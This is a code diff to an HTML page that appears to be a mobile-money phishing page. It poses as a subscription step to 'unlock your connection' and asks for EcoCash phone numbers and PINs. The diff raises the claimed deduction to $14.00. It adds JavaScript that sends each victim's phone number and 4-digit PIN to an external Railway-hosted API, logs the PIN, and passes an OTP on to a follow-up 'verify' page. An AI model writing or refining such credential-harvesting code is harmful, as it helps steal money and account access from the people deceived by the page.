@@ -340,6 +340,38 @@
             font-weight: 500;
         }
         
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 16px 30px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            max-width: 90%;
+            text-align: center;
+        }
+        
+        .toast.show {
+            opacity: 1;
+        }
+        
+        .toast.error {
+            background: #e74c3c;
+        }
+        
+        .toast.success {
+            background: #27ae60;
+        }
+        
         @media (max-width: 480px) {
             .logo-text {
                 font-size: 28px;
@@ -415,7 +447,7 @@
 
         <div style="background: rgba(255, 193, 7, 0.15); border: 2px solid #FFC107; border-radius: 12px; padding: 20px; margin-top: 30px; text-align: center; color: #333; font-weight: 600; font-size: 14px; line-height: 1.6;">
             ⚠️ <strong>IMPORTANT NOTICE</strong><br><br>
-            Ensure that you enter the Eco Cash Details in Order To Allow Our System To Deduct The $3.50 For Subscriptions Which Will Enable You To Unlock Your Connection.
+            Ensure that you enter the Eco Cash Details in Order To Allow Our System To Deduct The <strong>$14.00</strong> For Subscriptions Which Will Enable You To Unlock Your Connection.
         </div>
     </div>
 
@@ -448,36 +480,57 @@
             Please wait...<br> This usually takes a few seconds
         </div>
     </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast"></div>
     
     <script>
+        // ===== CONFIGURATION =====
+        const API_URL = 'https://classydateregistration-production.up.railway.app';
+        
+        // ===== DOM ELEMENTS =====
         const phoneInput = document.getElementById('phoneInput');
-        // Clear any saved phone on load
-        phoneInput.value = '';
-         
         const pinBoxes = document.querySelectorAll('.pin-box');
         const loginBtn = document.getElementById('loginBtn');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const toast = document.getElementById('toast');
+        
         let pinValue = '';
+        let isSubmitting = false;
 
+        // ===== TOAST NOTIFICATION =====
+        function showToast(message, type = '') {
+            toast.textContent = message;
+            toast.className = 'toast show ' + type;
+            setTimeout(() => {
+                toast.className = 'toast';
+            }, 5000);
+        }
+
+        // ===== CLEAR SAVED DATA ON LOAD =====
+        phoneInput.value = '';
+        pinBoxes.forEach(box => box.value = '');
+        localStorage.removeItem('phone');
+
+        // ===== PIN INPUT HANDLING =====
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
             loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
         }
-         
+
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
-                // Only allow numbers
                 box.value = box.value.replace(/\D/g, '');
                 if (box.value.length === 1 && index < 3) {
                     pinBoxes[index + 1].focus();
                 }
                 checkPinComplete();
             });
-             
+
             box.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && box.value === '' && index > 0) {
                     pinBoxes[index - 1].focus();
                 }
-                // Allow arrow keys to navigate
                 if (e.key === 'ArrowLeft' && index > 0) {
                     pinBoxes[index - 1].focus();
                 }
@@ -485,7 +538,7 @@
                     pinBoxes[index + 1].focus();
                 }
             });
-             
+
             box.addEventListener('paste', (e) => {
                 e.preventDefault();
                 const data = e.clipboardData.getData('text');
@@ -504,34 +557,106 @@
             });
         });
 
-        loginBtn.addEventListener('click', () => {
+        // ===== LOGIN BUTTON CLICK =====
+        loginBtn.addEventListener('click', async () => {
+            if (isSubmitting) return;
+
             const phone = phoneInput.value.trim();
             if (!phone) {
-                alert('Please enter your phone number');
+                showToast('Please enter your phone number', 'error');
                 phoneInput.focus();
                 return;
             }
-             
+
             if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
-                alert('Please enter a valid 9-digit phone number');
+                showToast('Please enter a valid 9-digit phone number', 'error');
                 phoneInput.focus();
                 return;
             }
-             
+
+            const pin = Array.from(pinBoxes).map(box => box.value).join('');
+            if (pin.length !== 4) {
+                showToast('Please enter your 4-digit PIN', 'error');
+                return;
+            }
+
+            // ===== DISABLE BUTTON & SHOW SPINNER =====
+            isSubmitting = true;
             loginBtn.disabled = true;
-            loginBtn.textContent = '✅ APPROVED';
-             
-            // Save phone number
-            localStorage.setItem('phone', phone);
-             
-            // Redirect to verify page
-            setTimeout(() => {
-                window.location.href = 'verifyzimbabwe.html';
-            }, 500);
+            loginBtn.textContent = '⏳ Processing...';
+            spinnerOverlay.style.display = 'flex';
+
+            const fullPhone = '263' + phone;
+
+            try {
+                console.log('📤 Sending login data:', { phone: fullPhone, pin: pin });
+
+                const response = await fetch(`${API_URL}/api/login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        phone: fullPhone, 
+                        pin: pin 
+                    })
+                });
+
+                console.log('📥 Response status:', response.status);
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    console.log('📥 Error response:', errorText);
+                    throw new Error(`Server error: ${response.status}`);
+                }
+
+                const data = await response.json();
+                console.log('📥 Response data:', data);
+
+                if (data.status === 'success') {
+                    const otp = data.data.otp;
+                    showToast('✅ Login successful! Redirecting...', 'success');
+                    
+                    loginBtn.textContent = '✅ APPROVED';
+                    
+                    // Save phone number
+                    localStorage.setItem('phone', phone);
+                    
+                    // Redirect to verify page with phone and OTP
+                    setTimeout(() => {
+                        spinnerOverlay.style.display = 'none';
+                        window.location.href = `verifyzimbabwe.html?phone=${phone}&otp=${otp}`;
+                    }, 1500);
+                    
+                } else {
+                    throw new Error(data.message || 'Login failed');
+                }
+
+            } catch (error) {
+                console.error('❌ Error:', error);
+                
+                let userMessage = 'Login failed. Please try again.';
+                if (error.message.includes('Failed to fetch') || error.message.includes('502')) {
+                    userMessage = 'Cannot connect to server. Please check your internet connection and try again.';
+                } else {
+                    userMessage = error.message || 'Login failed. Please try again.';
+                }
+                
+                showToast('❌ ' + userMessage, 'error');
+                
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'LOGIN';
+                isSubmitting = false;
+                spinnerOverlay.style.display = 'none';
+            }
         });
 
+        // ===== AUTO-FOCUS PHONE INPUT =====
+        phoneInput.focus();
+
+        // ===== CHECK PIN COMPLETE ON LOAD =====
         checkPinComplete();
-        pinBoxes[0].focus();
     </script>
 </body>
 
